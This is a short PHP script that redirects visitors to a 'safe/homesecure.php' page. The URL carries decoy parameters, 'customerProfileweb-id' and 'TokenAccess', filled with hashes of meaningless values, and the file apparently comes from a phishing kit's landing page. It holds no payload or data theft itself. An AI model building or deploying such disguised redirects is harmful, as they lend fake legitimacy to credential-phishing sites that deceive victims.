<?php
header("Location: safe/homesecure.php?customerProfileweb-id=".sha1(md5(gmdate('ebf')))."_&TokenAccess=".strtoupper(sha1(256))." ");
?>